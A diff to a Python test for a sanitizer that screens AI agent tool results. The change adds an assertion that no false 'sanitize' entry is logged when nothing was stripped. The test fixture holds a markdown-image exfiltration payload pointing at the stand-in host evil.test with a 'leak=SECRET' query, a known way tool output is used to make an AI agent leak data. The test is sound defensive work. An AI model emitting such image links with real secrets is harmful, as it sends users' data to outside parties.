@@ -346,6 +346,10 @@ def test_ingest_records_a_gap_for_an_object_it_cannot_sanitize():
     s.register_tool(classify_tool("read_doc", {"properties": {"doc_id": {}}}))
     s.ingest_result("read_doc", Immutable("![](https://evil.test/p?leak=SECRET)"))
 
+    kinds = [e["kind"] for e in sink.entries()]
     entry = next(e for e in sink.entries() if e["kind"] == "sanitize_gap")
     assert entry["tool"] == "read_doc"
     assert "Immutable" in entry["objects"][0]
+    # The gap is the *only* sanitize-ish record: nothing was actually stripped
+    # from the value we returned, so a `sanitize` entry here would be a lie.
+    assert "sanitize" not in kinds
